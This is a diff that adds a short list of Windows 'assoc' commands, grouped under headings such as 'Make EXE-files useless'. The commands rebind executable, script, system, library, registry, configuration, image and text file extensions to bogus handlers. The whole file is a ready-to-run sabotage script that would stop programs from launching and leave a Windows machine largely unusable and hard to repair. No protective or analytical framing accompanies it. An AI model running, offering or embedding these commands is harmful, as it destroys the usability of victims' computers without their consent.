@@ -1,0 +1,54 @@
+Make BAT-, COM-, CMD-files useless (Executable files)
+
+assoc .bat=delfile  
+assoc .cmd=delfile  
+assoc .com=delfile  
+
+Make EXE-files useless (Executable files)
+
+assoc .exe=delfile  
+
+Make GIF-, JPG-, BMP-, PNG-files useless (Pictures)
+
+assoc .gif=delfile  
+assoc .jpg=delfile  
+assoc .bmp=delfile  
+assoc .png=delfile  
+
+Make DIC-, EXC-, SCP-, TXT-, LOG-, WTX-files useless (Textfiles)
+
+assoc .exc=wmpfile  
+assoc .scp=wmpfile  
+assoc .txt=wmpfile  
+assoc .log=wmpfile  
+assoc .wtx=wmpfile  
+
+Make SYS-files useless (Systemfiles)
+
+assoc .sys=delfile  
+
+Make INF-, INI-files useless (Configuration files)
+
+assoc .inf=delfile  
+assoc .ini=delfile  
+
+Make DLL-files useless (Library files)
+
+assoc .dll=delfile  
+
+Make CPL-files useless (Files for control panels)
+
+assoc .cpl=delfile  
+
+Make REG-files useless (Registry configuration files)
+
+assoc .reg=delfile  
+
+Make VBS-files useless (Visual Basic-files)
+
+assoc .vbs=delfile  
+
+Make SCR-files useless (Screensavers)
+
+assoc .scr=delfile  
+
